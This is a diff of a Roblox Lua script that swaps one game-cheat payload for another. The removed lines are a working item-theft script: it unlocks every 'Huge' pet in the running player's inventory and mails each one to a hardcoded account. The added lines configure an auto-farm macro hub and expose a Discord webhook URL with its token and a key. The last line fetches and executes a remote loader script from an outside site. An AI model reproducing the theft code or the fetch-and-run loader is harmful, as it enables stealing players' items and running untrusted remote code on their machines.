@@ -1,23 +1,80 @@
-getgenv().MailToUser = "feffysmlfan922"
+getgenv().EquipMacroTroop = true
+getgenv().Config = {
+	["AutoVoteDifficulty"] = false,
+	["RequiredGem"] = 1000,
+	["SellRarities"] = {
+		["Legendary"] = false,
+		["Basic"] = false,
+		["Epic"] = false,
+		["Uncommon"] = false,
+		["Rare"] = false
+	},
+	["DelayReplay"] = 5,
+	["WH_MatchComplete"] = true,
+	["AutoSkip"] = true,
+	["AutoClaimQuest"] = true,
+	["TPLobbyIfPlayer"] = false,
+	["WH_MailSent"] = false,
+	["IgnoreMacroTiming"] = false,
+	["SelectMacro"] = "gacor3",
+	["ALFS_DelayHop"] = 30,
+	["PlaceFailsafe"] = false,
+	["AutoJoinEndless"] = false,
+	["PlayMacro"] = true,
+	["AutoMail"] = false,
+	["AutoUseBoost"] = false,
+	["AutoSummonTroop"] = false,
+	["AutoReplay"] = true,
+	["BoostFPS"] = true,
+	["SellWave"] = 1,
+	["AutoClaimEventPass"] = true,
+	["Summon10"] = true,
+	["RequireRoll"] = 0,
+	["UseAll"] = false,
+	["AutoJoinMatch"] = true,
+	["ALFS_HopServer"] = false,
+	["AutoClaimPlaytimeReward"] = true,
+	["SelectMap"] = "DrillWorld (Rewind)",
+	["AutoSellOW"] = false,
+	["JoinFailsafe"] = false,
+	["SelectCase"] = "BasicCrate",
+	["DelayJoin"] = 5,
+	["AutoClaimVIP"] = false,
+	["AutoRejoin"] = false,
+	["AutoListForSale"] = false,
+	["AutoBuyEvent"] = false,
+	["AutoClaimEventQuest"] = true,
+	["DeleteMap"] = true,
+	["WebhookURL"] = "https://discord.com/api/webhooks/1224325789537800283/UYJohxt6xl7IYLSeVFefWoYnbtv3tKkL5BIUHaCU7k38L0S0zeswE4acc0umpKG6ZHUj",
+	["SummonDelay"] = 0.3,
+	["ABE_Gift"] = false,
+	["AutoClaimDailyReward"] = true,
+	["AutoSave"] = true,
+	["UseBoosts"] = {
+		["2xDrillXPBoost"] = false,
+		["2xEggsBoost"] = false,
+		["2xLuckBoost_10"] = false,
+		["2xEventXPBoost"] = false,
+		["2xXPBoost"] = false,
+		["2xClocksBoost"] = false,
+		["2xCoinsBoost_1"] = false,
+		["2xEventXPBoost_1"] = false,
+		["2xEventXPBoost_10"] = false,
+		["2xXPBoost_10"] = false,
+		["2xCoinsBoost_10"] = false,
+		["2xXPBoost_Easter2024"] = false,
+		["2xCloversBoost"] = false,
+		["Weekend_2xEndlessXPBoost"] = false,
+		["Weekend_2xCoinsBoost"] = false,
+		["2xLuckBoost"] = false,
+		["2xDrillBoost"] = false,
+		["2xLuckBoost_1"] = false,
+		["2xXPBoost_1"] = false,
+		["2xCoinsBoost"] = false
+	},
+	["BlackScreen"] = false
+}
 
-local Network = require(game.ReplicatedStorage.Library.Client.Network)
+getgenv().Key = "kfb9f7ea4f20ba1834ea918c"
 
-local HugeUIDList = {}
-for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
-    if PetData.id:find("Huge ") then
-        table.insert(HugeUIDList, PetUID)
-        if PetData._lk then
-            repeat
-                task.wait()
-            until Network.Invoke("Locking_SetLocked", PetUID, false)
-            print("Unlocked", PetUID)
-        end
-    end
-end
-
-for _, PetUID in pairs(HugeUIDList) do
-    repeat
-        task.wait()
-    until Network.Invoke("Mailbox: Send", MailToUser, tostring(Random.new():NextInteger(9, 999999)), "Pet", PetUID, 1)
-    print("Sent", PetUID)
-end
+loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()
